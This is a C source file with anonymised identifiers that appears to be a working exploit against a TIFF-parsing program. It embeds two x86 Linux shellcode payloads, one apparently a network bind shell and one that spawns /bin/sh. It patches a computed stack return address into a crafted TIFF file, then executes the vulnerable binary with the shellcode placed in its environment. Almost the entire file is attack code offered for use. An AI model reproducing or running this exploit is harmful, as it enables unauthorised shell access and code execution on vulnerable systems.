
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 char* VAR_0 ;
 char* VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int FUNC_0 (int) ;
 int FUNC_1 (char*,char*,char*,int *,char**) ;
 int FUNC_2 (int ,char*,...) ;
 int FUNC_3 (int,int ,int ) ;
 int FUNC_4 (char*,int ) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*) ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_7 (char*) ;
 int FUNC_8 (int,void*,int) ;

int
FUNC_9(int VAR_7, char **VAR_8, char **VAR_9)
{

char VAR_10[] = "\x31\xc0\x50\x40\x50\x40\x50\xb0\x66\x31"
  "\xdb\x43\x89\xe1\xcd\x80\x99\x52\x52\x52"
  "\xba\x02\x01\x11\x11\xfe\xce\x52\x89\xe2"
  "\x31\xc9\xb1\x10\x51\x52\x50\x89\xc2\x89"
  "\xe1\xb0\x66\xb3\x02\x89\xe1\xcd\x80\xb0"
  "\x66\xb3\x04\x53\x52\x89\xe1\xcd\x80\x31"
  "\xc0\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05"
  "\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xb0\x3f"
  "\x49\xcd\x80\x41\xe2\xf8\x51\x68\x6e\x2f"
  "\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x51"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
 FUNC_6("Linux Enabled\n");
 char VAR_11[] =
  "\xeb\x20\x5e\x89\x76\x08\x31\xc0\x89\x46\x0c"
  "\x88\x46\x07\x8d\x56\x0c\x8d\x4e\x08\x89\xf3"
  "\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd"
  "\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f"
  "\x73\x68\x23";



 if(VAR_7 < 3)
 {
  FUNC_2(VAR_5, "Error, arguments are like these\n"
    "%s <path_to_vuln> <eviltiff.tiff>\n", VAR_8[0]);
  return -1;
 }

 char *VAR_12[] = {VAR_1, VAR_0, VAR_11, ((void*)0)};


 long VAR_13 = 0xc0000000 - sizeof(void *) - FUNC_7(VAR_8[1]) - FUNC_7(VAR_11) - 0x02;

 int VAR_14 = FUNC_4(VAR_8[2], VAR_3);
 if(VAR_14 == -1)
 {
  FUNC_5("open()");
  return -1;
 }

 if(FUNC_3(VAR_14, VAR_2, VAR_4) == -1)
 {
  FUNC_5("lseek()");
  FUNC_0(VAR_14);
  return -1;
 }

 if(FUNC_8(VAR_14, (void *) &VAR_13, sizeof(long)) < sizeof(long))
 {
  FUNC_5("write()");
  FUNC_0(VAR_14);
  return -1;
 }

 FUNC_0(VAR_14);

 FUNC_2(VAR_6, "Using RET: 0x%.8x\n", (unsigned int) VAR_13);

 if(FUNC_1(VAR_8[1], "tiff", VAR_8[2], ((void*)0), VAR_12) == -1)
 {
  FUNC_5("execve()");
  return -1;
 }

 return 0;
}
